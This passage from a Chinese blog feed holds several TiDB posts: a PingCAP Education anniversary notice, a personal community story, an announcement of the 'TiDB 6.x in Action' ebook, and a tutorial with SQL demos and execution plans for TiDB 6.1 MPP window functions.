<p>应 TiDBer 们的强烈呼唤，同时也为了感谢大家一路以来的陪伴，PingCAP Education 特开放 100 个 PCTA 认证考试兑换码，希望帮助更多同学系统学习 TiDB 知识，感受 TiDB 的魅力。</p>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2022/tidb/pingcap-education-4-years/pe-3.png"
                      alt="" loading="lazy"
                ></p>
<h2 id="写在后面的话">写在后面的话</h2>
<p>关于 PingCAP Education 的四周年：</p>
<p>是的，早在 2018 年，TiDB 的第一个学习认证项目就已经启动，PingCAP 就已经有了体系化的 TiDB 课程，有了 PCTA 认证，4 年的时间里，TiDB 课程从 3.0 升级到 6.0，从中文扩展到英文、日文；努力为全球 DBA、应用开发者、架构师、高校老师、高校学生等数据库从业人员提供更加系统且高质量的学习素材。无数 TiDBer 因 TiDB 课程和认证与 TiDB 结缘，在学习过程中得到历练。</p>
<p>“卷”完了 TiDB 所有课程和认证的 Shawn Yan 说</p>
<blockquote>
<p>我和 TiDB 的主线故事，从“TiDBer Talk：TiDB 认证分享会”开始。<br>
作为一名合格的 TiJuaner，自然是 PE 课程和认证全卷一遍。PE 课程都是良心课程，把商业课程做到了“限时免费”，对于数据库小白，或者有一定其他数据库基础的同学都可以快速、有效地学习 TiDB。<br>
—— 节选自《专栏 - 我和 TiDB 的故事 | 横看成岭侧成峰 | TiDB 社区》</p>
</blockquote>
<p>PingCAP Education 四周年，还有更多学习认证相关福利不定期掉落，敬请关注！</p>
<hr>
<p><a class="link"   href="https://mp.weixin.qq.com/s/PtaITvmJlEmpdKq3zhv2Sg" >https://mp.weixin.qq.com/s/PtaITvmJlEmpdKq3zhv2Sg <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>TiDB</category>
        <category>Education</category>
      </categories>
      <tags>
        <tag>tidb</tag>
        <tag>pingcap</tag>
        <tag>pcta</tag>
        <tag>pingcap认证</tag>
        <tag>education</tag>
      </tags>
  </entry>
  <entry>
    <title>我和 TiDB 的故事 | 横看成岭侧成峰</title>
    <url>/2022/tidb/my-story-with-tidb-2022/</url>
    <content><![CDATA[<h2 id="Hello-TiDB">Hello, TiDB!</h2>
<p>这是我加入 TiDB 社区的第 293 天。</p>
<img  alt="1.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/1-1659612618998.jpg"
                     
                >
<p>入行 IT 多年，救火数次，原本打算抱着 MySQL 从一而终，却忘了最大的确定就是不确定性。</p>
<p>国产数据库的春天已来，DBA 也应与时俱进，从石器时代走向更先进、更开放的时代，去了解、熟悉、掌握国产数据库，比如领军者 TiDB。</p>
<img  alt="2.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/2-1659593408212.jpg"
                     
                >
<p>TiDB 是创业即开源的真国产开源数据库，刚接触 TiDB 时，我就被其全开放的源码、文档所吸引，后逐渐发现有各种优秀的活动或课程，比如，适合在校大学生的 Talent Plan，适合极客的 Hacking Camp，适合 DBA 或开发者的 PingCAP Education 系列课程。</p>
<p>而我和 TiDB 的主线故事，是从“TiDBer Talk：TiDB 认证分享会”开始的。</p>
<h2 id="精进的过程">精进的过程</h2>
<h3 id="TiDB-能力认证">TiDB 能力认证</h3>
<p>作为一名合格的 TiJuaner，自然是 PE 课程和认证全卷一遍。我一直推崇“以考促学”，对于刚接触一个新数据库，快速搭建最小验证环境，先用起来，对其有现实感受。与此同时，翻阅<a class="link"   href="https://docs.pingcap.com/zh/tidb/stable" >官方文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>和学习<a class="link"   href="https://tidb.net/book/tidb-monthly/2022-07/tidb-certification/tidb-course" >原厂课程 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，可以帮助我快速补齐理论知识，以此做到理论与运用“双工”推进。</p>
<p>不得不说，TiDB PE 课程都是良心课程，把商业课程做到了“限时免费”，对于数据库小白，或者有一定其他数据库基础的同学都可以快速、有效地学习 TiDB，对课程有疑问可以在论坛反馈，问题基本会得到有效解决，形成了良好的课程学习闭环。</p>
<img  alt="3.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/3-1659593426317.jpg"
                     
                >
<h3 id="TiDB-6-x-in-Action">TiDB 6.x in Action</h3>
<p><a class="link"   href="https://tidb.net/book/book-rush/" >TiDB 6.x in Action <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 已正式发布。<a class="link"   href="https://tidb.net/book/book-rush/event-guide/event-detail" >TiDB 6.0 Book Rush 活动 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>从4月中旬开始，到7月下旬正式收官，我除了中间生病的一段时间，都有全程参与。在研究 TiDB 的同时，保持输出文章；在 Review 文章的同时，精读其他同学的文章，以拓宽、加深自己的知识面；在编辑电子书的同时，模仿操练案例，以查漏补缺。</p>
<p>好活动就是这样，令我乐在其中，但“副作用”也是有的，会占满业余时间，甚至在凌晨一点多还在看 PR，翻相关帖子或者 Issue。</p>
<img  alt="4.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/4-1659593434975.jpg"
                     
                >
<h2 id="有趣的灵魂">有趣的灵魂</h2>
<h3 id="520-特辑-之-猜谜">520 特辑 之 猜谜</h3>
<p>谜题的乐趣是在于烧脑还是解谜时的畅快？</p>
<p>二者皆有吧，一群有趣的人在 520 这天玩“烧脑”游戏，有兴趣的同学都可以来试试，感受一下什么叫 Ti 式幽默。</p>
<p>Q: A Prophet who controls the past controls the future.</p>
<p>A: 不止黑客帝国里有先知，TiDB 里也有，这就是 TSO（Timestamp Oracle）。</p>
<p>更多谜题在帖子：<a class="link"   href="https://asktug.com/t/topic/666057" >这么烧脑有趣的活动，你确定你不来试一下？ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<img  alt="5.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/5-1659612634850.png"
                     
                >
<h3 id="520-特辑-之-图云">520 特辑 之 图云</h3>
<p>特别的“爱”，给特别的“你”，最活跃的小伙伴都出现这个帖子里了。</p>
<p><a class="link"   href="https://asktug.com/t/topic/665626" >【520特辑】让 TiDB 社区大声说出对你们的 “爱” <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://asktug.com/" >AskTUG 论坛 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>就是 TiJuaner 的精神家园，找@表妹 获取了我最新的热力图，除了过年和病假的那段时间，看来我今年还是常来“HOME”的，有时周末也会来“打卡”。</p>
<img  alt="6.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/6-1659593466054.png"
                     
                >
<p>在 AskTUG，不仅可以收获第一手社区新鲜事，TiDB 异常案例、解决方案，还有丰富的<a class="link"   href="https://asktug.com/c/resource" >资源案例 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，也还有我有幸参与编辑的<a class="link"   href="https://tidb.net/book/tidb-monthly/2022-07/" >技术月刊 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
<img  alt="7.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/9-1659593493082.jpg"
                     
                >
<p>另外，TiDB 社区有些快乐是想象不到的。不到一年的时间，我收获了 16 枚徽章，其中最惊喜的莫过于“版主候选人”。</p>
<img  alt="8.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/7-1659593474771.jpg"
                     
                >
<p>当然，还有其他的一堆“惊喜”，比如，绝版帆布包，绝版“吃豆豆”T恤，最炫 Ti 键盘，新款表妹同款挎包，等灯噔噔~</p>
<img  alt="9.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/10-1659612651084.jpg"
                     
                >
<h2 id="待续">待续</h2>
<p>盛夏的夜，蝉鸣不止，沉迷于 TiDB 而无法自拔，闷热仿佛都消散了些。</p>
<p>回归 DBA 的初心，我们是“登山者”，也是“开拓者”，目标明确，不自设上限。</p>
<p>同时，还需心存敬畏，厚积薄发，方能耕获菑畲。</p>
<p>最后的最后，请 @billmay，hhh~</p>
<img  alt="10.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/8-1659593481556.png"
                     
                >
<hr>
<p>特别鸣谢：@YY 友情设计的 banner.</p>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/452257" >https://www.modb.pro/db/452257 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
<a class="link"   href="https://tidb.net/blog/64694b36?shareId=efb99145" >https://tidb.net/blog/64694b36?shareId=efb99145 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>TiDB</category>
        <category>Book</category>
      </categories>
      <tags>
        <tag>tidb</tag>
        <tag>tidb 6.x</tag>
        <tag>TiJuaner</tag>
        <tag>pingcap</tag>
        <tag>TiExplorer</tag>
        <tag>story</tag>
      </tags>
  </entry>
  <entry>
    <title>《TiDB 6.x in Action》发布，凝聚社区集体智慧的 6.x 实践汇总！</title>
    <url>/2022/tidb/tidb-6.x-in-action-published/</url>
    <content><![CDATA[<blockquote>
<p>节选自 PingCAP 公众号<br>
原文链接：<a class="link"   href="https://mp.weixin.qq.com/s?__biz=MzI3NDIxNTQyOQ==&amp;mid=2247505131&amp;idx=1&amp;sn=5d063a0f446050e73e8270d3f93d8a1e" >《TiDB 6.x in Action》发布，凝聚社区集体智慧的 6.x 实践汇总！ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p>今年，TiDB 已经发布了 6.0 和 6.1 两个较大的版本更新，在 6.0 中大幅度加强了 TiDB 的可管理性和可运维性， 6.1 中又进一步提升了 TiDB 产品的稳定性。为了帮助更多的用户把新版本中这些“好用”的特性用起来，我们集结社区的集体智慧，共同创作了《TiDB 6.x in Action》。今天，这本书正式发布啦！</p>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/img/tidb/tidb-6.x-in-action-banner.jpg"
                      alt="" loading="lazy"
                ></p>
<h2 id="TiDB-6-x-in-Action-内容概览">TiDB 6.x in Action 内容概览</h2>
<p>《TiDB 6.x in Action》分为 TiDB 6.x 原理和特性、TiDB Developer 体验指南、TiDB 6.x 可管理性、TiDB 6.x 内核优化与性能提升、TiDB 6.x 测评、TiDB 6.x 最佳实践 6 大内容模块，汇聚了 TiDB 6.x 新特性的原理、测评、试用心得等等干货。不管你是 DBA 运维还是应用开发者，如果你正在或有意向使用 TiDB 6.x，这本书都可以给你提供参考和实践指南。</p>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2022/tidb/tidb-6.x-in-action-published/book-action-1.png"
                      alt="" loading="lazy"
                ></p>
<h2 id="共创寄语">共创寄语</h2>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2022/tidb/tidb-6.x-in-action-published/book-action-2.jpg"
                      alt="" loading="lazy"
                ></p>
<h2 id="凝聚社区集体智慧的-6-x-实践汇总">凝聚社区集体智慧的 6.x 实践汇总</h2>
<p>《TiDB 6.x in Action》托管在 GitHub 上，活动之初就公布了电子书大纲，整个创作过程耗时 3 个月，历经新版本试用、文章撰写、文章 Review、文章修改、提交 PR 等环节，每个环节都凝聚了参与者非常多的精力和付出，给所有参与者们点赞！</p>
<p>电子书最终共收录 46 篇文章，这些来自社区小伙伴的文章，都是用户在自己的环境里使用 TiDB 6.x 的实践总结，每一篇文章都图文并茂，有实际操作的依据，并且在试用过程中遇到的问题及解决方案也都被总结到了文章中。</p>
<p>此外，由社区活跃成员和 PingCAP 产研小伙伴们组成的 Reviewer 小组，历时 2 个多月，对每篇文章都进行了至少 2 遍的深度审核，在文章正确性和可读性方面提出了很多宝贵建议，保证了最终入选文章的准确性和高质量。感谢所有参与 Review 的老师们，感谢所有参与到本次活动每个环节中的小伙伴们。</p>
<h2 id="《TiDB-6-x-in-Action》">《TiDB 6.x in Action》</h2>
<p>点击链接：<a class="link"   href="https://tidb.net/book/book-rush/catalog" >https://tidb.net/book/book-rush/catalog <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 查看《TiDB 6.x in Action》电子书</p>
<hr>
<p><a class="link"   href="https://mp.weixin.qq.com/s/3k5B1E4r8gJLYYKIPmx0og" >https://mp.weixin.qq.com/s/3k5B1E4r8gJLYYKIPmx0og <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>TiDB</category>
        <category>Book</category>
      </categories>
      <tags>
        <tag>tidb</tag>
        <tag>tidb 6.x</tag>
        <tag>pingcap</tag>
        <tag>asktug</tag>
      </tags>
  </entry>
  <entry>
    <title>TiDB 6.x 新特性解读 | TiDB 6.1 MPP 实现窗口函数框架</title>
    <url>/2022/tidb/tidb-6.1-mpp-window-functions/</url>
    <content><![CDATA[<p><a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/release-6.1.0" >TiDB v6.1.0 LTS <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 已于6月13日发版，其中有一项关键特性为“MPP 实现窗口函数框架”。TiDB 中的窗口函数是在 TiDB 3.0 GA 版本引入，基本兼容 MySQL 8.0 所支持的窗口函数。<br>
下面将演示本次发版引入 MPP 所支持的三个窗口函数，并扩展对比其他窗口函数在 TiDB 和 MariaDB 中的执行情况，最后以表格的形式展示几种常见数据库对窗口函数的支持情况。</p>
<img  alt="IMG_2005.JPG" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/IMG_2005-1652257515326.jpg"
                      referrerpolicy="no-referrer"
                >
<h2 id="窗口函数">窗口函数</h2>
<p>先来回忆下窗口函数的定义：</p>
<p>窗口函数是在 SQL:2003 引入的，并在之后的 SQL 标准中不断增强。Wiki 中对窗口函数的表述为：</p>
<blockquote>
<p>在SQL中，窗口函数或分析函数是使用一个或多个行的值为每一行返回一个值的函数。（这与聚合函数不同，聚合函数为多行返回一个值。）窗口函数有一个OVER子句；任何没有OVER子句的函数都不是窗口函数，而是聚合函数或单行(标量)函数。</p>
</blockquote>
<p>注：在 Oracle 数据库中，窗口函数被称为分析函数（Analytic Functions）。</p>
<p>窗口函数可以分为非聚合窗口函数、聚合窗口函数两大类，本文主要介绍<strong>非聚合窗口函数</strong>。</p>
<h3 id="MySQL-8-0-支持的窗口函数">MySQL 8.0 支持的窗口函数</h3>
<p>MySQL 8.0 支持 11 种窗口函数，即 <code>RANK() / ROW_NUMBER() / DENSE_RANK() / CUME_DIST() / FIRST_VALUE() / LAST_VALUE() / NTH_VALUE() / LAG() / LEAD() / NTILE() / PERCENT_RANK()</code>。</p>
<p>这 11 种窗口函数 TiDB 也均支持。</p>
<p>这里解释一下文章开头提到的“基本兼容 MySQL 8.0 所支持的窗口函数”，是因为 MySQL 8.0.14 支持 JSON 函数 <code>JSON_ARRAYAGG()</code> 作为窗口函数，而该函数目前 TiDB 尚未支持，具体可参考 <a class="link"   href="https://github.com/pingcap/tidb/issues/7546" >#7546 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。</p>
<h3 id="MPP-新增支持的三个窗口函数">MPP 新增支持的三个窗口函数</h3>
<p>书归正题，在 TiDB 6.1 版本中，TiFlash 新增支持 <code>RANK() / ROW_NUMBER() / DENSE_RANK()</code> 三个窗口函数，且仅可用于 MPP 模式。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">dbms/src/Flash/Coprocessor/collectOutputFieldTypes.cpp</span><br><span class="line">    <span class="keyword">case</span> tipb::ExecType::TypeWindow:</span><br><span class="line">        <span class="comment">// Window will only be pushed down in mpp mode.</span></span><br><span class="line">        <span class="comment">// In mpp mode, ExchangeSender or Sender will return output_field_types directly.</span></span><br><span class="line">        <span class="comment">// If not in mpp mode, window executor type is invalid.</span></span><br><span class="line">        throw TiFlashException(<span class="string">&quot;Window executor type is invalid in non-mpp mode, should not reach here.&quot;</span>, Errors::Coprocessor::Internal);</span><br></pre></td></tr></table></figure></div>
<p>下面对窗口函数进行实际演示。</p>
<h4 id="测试数据">测试数据</h4>
<p>创建测试表，并写入测试数据。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> if <span class="keyword">EXISTS</span> student;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> if <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> student (course <span class="type">VARCHAR</span>(<span class="number">10</span>), mark <span class="type">INT</span>, name <span class="type">VARCHAR</span>(<span class="number">10</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span></span><br><span class="line">(<span class="string">&#x27;Maths&#x27;</span>, <span class="number">60</span>, <span class="string">&#x27;Thulile&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;Maths&#x27;</span>, <span class="number">60</span>, <span class="string">&#x27;Pritha&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;Maths&#x27;</span>, <span class="number">70</span>, <span class="string">&#x27;Voitto&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;Maths&#x27;</span>, <span class="number">55</span>, <span class="string">&#x27;Chun&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;Biology&#x27;</span>, <span class="number">60</span>, <span class="string">&#x27;Bilal&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;Biology&#x27;</span>, <span class="number">70</span>, <span class="string">&#x27;Roger&#x27;</span>);</span><br></pre></td></tr></table></figure></div>
<h4 id="RANK-ROW-NUMBER-DENSE-RANK">RANK() / ROW_NUMBER() / DENSE_RANK()</h4>
<ol>
<li>功能描述</li>
</ol>
<ul>
<li>RANK()：返回分区中当前行的排名，排名可能不连续。</li>
<li>ROW_NUMBER()：返回分区中当前行的编号。相同结果顺序排名，编号不相同。</li>
<li>DENSE_RANK()：返回分区中当前行的排名。相同结果相同排名。</li>
</ul>
<ol start="2">
<li>演示结果</li>
</ol>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">TiDB [test] <span class="number">21</span>:<span class="number">38</span>:<span class="number">44</span><span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="built_in">RANK</span>() <span class="keyword">OVER</span> w <span class="keyword">AS</span> `rank`, <span class="built_in">ROW_NUMBER</span>() <span class="keyword">OVER</span> w <span class="keyword">AS</span> `row_num`, <span class="built_in">DENSE_RANK</span>() <span class="keyword">OVER</span> w <span class="keyword">AS</span> `dense_rank`, course, mark, name <span class="keyword">FROM</span> student <span class="keyword">window</span> w <span class="keyword">AS</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> course <span class="keyword">ORDER</span> <span class="keyword">BY</span> mark <span class="keyword">DESC</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">------+---------+------------+---------+------+---------+</span></span><br><span class="line"><span class="operator">|</span> rank <span class="operator">|</span> row_num <span class="operator">|</span> dense_rank <span class="operator">|</span> course  <span class="operator">|</span> mark <span class="operator">|</span> name    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+---------+------------+---------+------+---------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span>       <span class="number">1</span> <span class="operator">|</span>          <span class="number">1</span> <span class="operator">|</span> Biology <span class="operator">|</span>   <span class="number">70</span> <span class="operator">|</span> Roger   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">2</span> <span class="operator">|</span>       <span class="number">2</span> <span class="operator">|</span>          <span class="number">2</span> <span class="operator">|</span> Biology <span class="operator">|</span>   <span class="number">60</span> <span class="operator">|</span> Bilal   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span>       <span class="number">1</span> <span class="operator">|</span>          <span class="number">1</span> <span class="operator">|</span> Maths   <span class="operator">|</span>   <span class="number">70</span> <span class="operator">|</span> Voitto  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">2</span> <span class="operator">|</span>       <span class="number">2</span> <span class="operator">|</span>          <span class="number">2</span> <span class="operator">|</span> Maths   <span class="operator">|</span>   <span class="number">60</span> <span class="operator">|</span> Thulile <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">2</span> <span class="operator">|</span>       <span class="number">3</span> <span class="operator">|</span>          <span class="number">2</span> <span class="operator">|</span> Maths   <span class="operator">|</span>   <span class="number">60</span> <span class="operator">|</span> Pritha  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">4</span> <span class="operator">|</span>       <span class="number">4</span> <span class="operator">|</span>          <span class="number">3</span> <span class="operator">|</span> Maths   <span class="operator">|</span>   <span class="number">55</span> <span class="operator">|</span> Chun    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+---------+------------+---------+------+---------+</span></span><br><span class="line"><span class="number">6</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.005</span> sec)</span><br></pre></td></tr></table></figure></div>
<ol start="3">
<li>一般执行计划</li>
</ol>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">TiDB [test] <span class="number">21</span>:<span class="number">38</span>:<span class="number">46</span><span class="operator">&gt;</span> explain <span class="keyword">SELECT</span> <span class="built_in">RANK</span>() <span class="keyword">OVER</span> w <span class="keyword">AS</span> `rank`, <span class="built_in">ROW_NUMBER</span>() <span class="keyword">OVER</span> w <span class="keyword">AS</span> `row_num`, <span class="built_in">DENSE_RANK</span>() <span class="keyword">OVER</span> w <span class="keyword">AS</span> `dense_rank`, course, mark, name <span class="keyword">FROM</span> student <span class="keyword">window</span> w <span class="keyword">AS</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> course <span class="keyword">ORDER</span> <span class="keyword">BY</span> mark <span class="keyword">DESC</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------+----------+-----------+---------------+----------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> id                             <span class="operator">|</span> estRows  <span class="operator">|</span> task      <span class="operator">|</span> access object <span class="operator">|</span> operator info                                                                                                                          <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------+----------+-----------+---------------+----------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> Projection_8                   <span class="operator">|</span> <span class="number">10000.00</span> <span class="operator">|</span> root      <span class="operator">|</span>               <span class="operator">|</span> <span class="keyword">Column</span>#<span class="number">9</span>, <span class="keyword">Column</span>#<span class="number">8</span>, <span class="keyword">Column</span>#<span class="number">10</span>, test.student.course, test.student.mark, test.student.name                                               <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> └─Window_9                     <span class="operator">|</span> <span class="number">10000.00</span> <span class="operator">|</span> root      <span class="operator">|</span>               <span class="operator">|</span> <span class="built_in">rank</span>()<span class="operator">-</span><span class="operator">&gt;</span><span class="keyword">Column</span>#<span class="number">9</span>, <span class="built_in">dense_rank</span>()<span class="operator">-</span><span class="operator">&gt;</span><span class="keyword">Column</span>#<span class="number">10</span> <span class="keyword">over</span>(<span class="keyword">partition</span> <span class="keyword">by</span> test.student.course <span class="keyword">order</span> <span class="keyword">by</span> test.student.mark <span class="keyword">desc</span>)                       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>   └─Window_10                  <span class="operator">|</span> <span class="number">10000.00</span> <span class="operator">|</span> root      <span class="operator">|</span>               <span class="operator">|</span> <span class="built_in">row_number</span>()<span class="operator">-</span><span class="operator">&gt;</span><span class="keyword">Column</span>#<span class="number">8</span> <span class="keyword">over</span>(<span class="keyword">partition</span> <span class="keyword">by</span> test.student.course <span class="keyword">order</span> <span class="keyword">by</span> test.student.mark <span class="keyword">desc</span> <span class="keyword">rows</span> <span class="keyword">between</span> <span class="keyword">current</span> <span class="type">row</span> <span class="keyword">and</span> <span class="keyword">current</span> <span class="type">row</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>     └─Sort_14                  <span class="operator">|</span> <span class="number">10000.00</span> <span class="operator">|</span> root      <span class="operator">|</span>               <span class="operator">|</span> test.student.course, test.student.mark:<span class="keyword">desc</span>                                                                                            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>       └─TableReader_13         <span class="operator">|</span> <span class="number">10000.00</span> <span class="operator">|</span> root      <span class="operator">|</span>               <span class="operator">|</span> data:TableFullScan_12                                                                                                                  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>         └─TableFullScan_12     <span class="operator">|</span> <span class="number">10000.00</span> <span class="operator">|</span> cop[tikv] <span class="operator">|</span> <span class="keyword">table</span>:student <span class="operator">|</span> keep <span class="keyword">order</span>:<span class="literal">false</span>, stats:pseudo                                                                                                         <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------+----------+-----------+---------------+----------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">6</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.002</span> sec)</span><br></pre></td></tr></table></figure></div>
<ol start="4">
<li>创建 TiFlash 副本后走 MPP 框架的执行计划</li>
</ol>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">TiDB [test] <span class="number">21</span>:<span class="number">44</span>:<span class="number">13</span><span class="operator">&gt;</span> explain <span class="keyword">SELECT</span> <span class="built_in">RANK</span>() <span class="keyword">OVER</span> w <span class="keyword">AS</span> `rank`, <span class="built_in">ROW_NUMBER</span>() <span class="keyword">OVER</span> w <span class="keyword">AS</span> `row_num`, <span class="built_in">DENSE_RANK</span>() <span class="keyword">OVER</span> w <span class="keyword">AS</span> `dense_rank`, course, mark, name <span class="keyword">FROM</span> student <span class="keyword">window</span> w <span class="keyword">AS</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> course <span class="keyword">ORDER</span> <span class="keyword">BY</span> mark <span class="keyword">DESC</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------+---------+--------------+---------------+----------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> id                                   <span class="operator">|</span> estRows <span class="operator">|</span> task         <span class="operator">|</span> access object <span class="operator">|</span> operator info                                                                                                                          <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------+---------+--------------+---------------+----------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> Projection_8                         <span class="operator">|</span> <span class="number">6.00</span>    <span class="operator">|</span> root         <span class="operator">|</span>               <span class="operator">|</span> <span class="keyword">Column</span>#<span class="number">9</span>, <span class="keyword">Column</span>#<span class="number">8</span>, <span class="keyword">Column</span>#<span class="number">10</span>, test.student.course, test.student.mark, test.student.name                                               <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> └─TableReader_19                     <span class="operator">|</span> <span class="number">6.00</span>    <span class="operator">|</span> root         <span class="operator">|</span>               <span class="operator">|</span> data:ExchangeSender_18                                                                                                                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>   └─ExchangeSender_18                <span class="operator">|</span> <span class="number">6.00</span>    <span class="operator">|</span> mpp[tiflash] <span class="operator">|</span>               <span class="operator">|</span> ExchangeType: PassThrough                                                                                                              <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>     └─Window_9                       <span class="operator">|</span> <span class="number">6.00</span>    <span class="operator">|</span> mpp[tiflash] <span class="operator">|</span>               <span class="operator">|</span> <span class="built_in">rank</span>()<span class="operator">-</span><span class="operator">&gt;</span><span class="keyword">Column</span>#<span class="number">9</span>, <span class="built_in">dense_rank</span>()<span class="operator">-</span><span class="operator">&gt;</span><span class="keyword">Column</span>#<span class="number">10</span> <span class="keyword">over</span>(<span class="keyword">partition</span> <span class="keyword">by</span> test.student.course <span class="keyword">order</span> <span class="keyword">by</span> test.student.mark <span class="keyword">desc</span>)                       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>       └─Window_11                    <span class="operator">|</span> <span class="number">6.00</span>    <span class="operator">|</span> mpp[tiflash] <span class="operator">|</span>               <span class="operator">|</span> <span class="built_in">row_number</span>()<span class="operator">-</span><span class="operator">&gt;</span><span class="keyword">Column</span>#<span class="number">8</span> <span class="keyword">over</span>(<span class="keyword">partition</span> <span class="keyword">by</span> test.student.course <span class="keyword">order</span> <span class="keyword">by</span> test.student.mark <span class="keyword">desc</span> <span class="keyword">rows</span> <span class="keyword">between</span> <span class="keyword">current</span> <span class="type">row</span> <span class="keyword">and</span> <span class="keyword">current</span> <span class="type">row</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>         └─Sort_16                    <span class="operator">|</span> <span class="number">6.00</span>    <span class="operator">|</span> mpp[tiflash] <span class="operator">|</span>               <span class="operator">|</span> test.student.course, test.student.mark:<span class="keyword">desc</span>                                                                                            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>           